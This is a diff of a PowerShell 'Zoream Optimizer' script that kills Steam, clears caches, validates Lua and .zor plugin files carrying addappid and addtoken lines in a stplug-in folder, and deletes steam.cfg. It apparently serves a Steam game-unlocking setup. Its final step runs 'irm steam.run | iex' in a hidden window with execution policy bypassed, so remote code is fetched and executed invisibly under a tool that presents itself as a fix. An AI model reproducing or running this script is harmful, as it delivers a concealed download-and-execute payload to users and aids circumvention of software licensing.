@@ -1,4 +1,3 @@
-# -------------------- 0. CONSOLE PREP & ANTI-FREEZE --------------------
 try {
     $MethodDefinition = @'
     [DllImport("kernel32.dll")]
@@ -26,7 +25,6 @@ $host.UI.RawUI.ForegroundColor = "White"
 $host.UI.RawUI.WindowTitle = "Zoream Optimizer | SYS_0xA7"
 Clear-Host
 
-# -------------------- 1. ADMIN CHECK --------------------
 $identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
 $principal = New-Object Security.Principal.WindowsPrincipal($identity)
 $isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -44,7 +42,6 @@ if (-not $isAdmin) {
 
 Disable-QuickEdit
 
-# -------------------- 2. UI HELPERS --------------------
 function Show-Header {
     Write-Host " "
     Write-Host "   ███████╗ ██████╗ ██████╗ ███████╗ █████╗ ███╗   ███╗" -ForegroundColor Cyan
@@ -71,7 +68,6 @@ function Write-Log {
     }
 }
 
-# -------------------- 3. MAIN LOGIC --------------------
 Clear-Host
 Show-Header
 Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"
@@ -81,13 +77,11 @@ try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").I
 if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }
 
 
-# Reset Steam Beta & Terminate
 Write-Log "Clearing Beta & Killing Processes..." "STEP"
 Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
 Start-Sleep -Seconds 5
 Get-Process steam* -ErrorAction SilentlyContinue | Stop-Process -Force
 
-# Cache Cleaning
 $backupPath = Join-Path $steamPath "cache-backup"
 New-Item -ItemType Directory -Path $backupPath -Force | Out-Null
 
@@ -114,53 +108,64 @@ if (Test-Path $userdataPath) {
 }
 
 
-# --- PLUGIN VALIDATION & AUTO-CLEAN ---
 Write-Log "Validating and Cleaning stplug-in folder..." "STEP"
 $stpluginPath = Join-Path $steamPath "config\stplug-in"
 
 if (-not (Test-Path $stpluginPath)) {
     Write-Log "stplug-in folder does not exist!" "WARN"
-} else {
-    # 1. Non-Lua File Cleanup
+}
+else {
+
     Get-ChildItem $stpluginPath -File | ForEach-Object {
-        if ($_.Extension -ne ".lua") {
-            Write-Log "Removing non-lua file: $($_.Name)" "ERROR"
+
+        if ($_.Extension -notin @(".lua", ".zor")) {
+            Write-Log "Removing invalid file type: $($_.Name)" "ERROR"
             Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
         }
     }
 
-    # Validation Function
     function Test-ValidLuaLine {
         param([string]$Line)
+
         $trimmed = $Line.Trim()
-        if ([string]::IsNullOrWhiteSpace($trimmed) -or $trimmed.StartsWith('-')) { return $true }
+
+        if ([string]::IsNullOrWhiteSpace($trimmed)) { return $true }
+        if ($trimmed.StartsWith('-')) { return $true }
+
         if ($trimmed -match '^(?i)(addappid|setManifestid|addtoken)') {
-            if ($trimmed -match '\(' -and $trimmed -match '\)') { return $true }
+            if ($trimmed -match '\(' -and $trimmed -match '\)') {
+                return $true
+            }
         }
+
         return $false
     }
 
-    # 2. Invalid Lua Content Cleanup
-    Get-ChildItem $stpluginPath -Filter "*.lua" | ForEach-Object {
+    Get-ChildItem $stpluginPath -File | Where-Object {
+        $_.Extension -in @(".lua", ".zor")
+    } | ForEach-Object {
+
         $lines = Get-Content $_.FullName
         $isClean = $true
+
         foreach ($l in $lines) {
-            if (-not (Test-ValidLuaLine $l)) { 
+            if (-not (Test-ValidLuaLine $l)) {
                 $isClean = $false
-                break 
+                break
             }
         }
-        
-        if ($isClean) { 
-            Write-Log "Validated: $($_.Name)" "SUCCESS" 
-        } else { 
-            Write-Log "Invalid content detected! Deleting: $($_.Name)" "ERROR" 
+
+        if ($isClean) {
+            Write-Log "Validated: $($_.Name)" "SUCCESS"
+        }
+        else {
+            Write-Log "Invalid content detected! Deleting: $($_.Name)" "ERROR"
             Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
         }
     }
 }
 
-# Delete steam.cfg
+
 Write-Log "Checking for steam.cfg..." "STEP"
 $cfgFiles = @("steam.cfg", "Steam.cfg")
 foreach ($cfg in $cfgFiles) {
@@ -171,18 +176,15 @@ foreach ($cfg in $cfgFiles) {
     }
 }
 
-# -------------------- 4. FINAL & HIDDEN EXECUTION --------------------
 
 Write-Log "Fix & Cleanup complete." "SUCCESS"
 Write-Host " "
 Write-Host "   >>> CORE EXECUTING IN BACKGROUND <<<" -ForegroundColor Cyan
 Write-Host " "
 
-# Background Execute steam.run
 $command = "irm steam.run | iex"
 Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden
 
-# Geri Sayım
 for ($i = 5; $i -gt 0; $i--) {
     Write-Host "`r   >>> This window will close in $i second(s) <<<  " -ForegroundColor Magenta -NoNewline
     Start-Sleep -Seconds 1
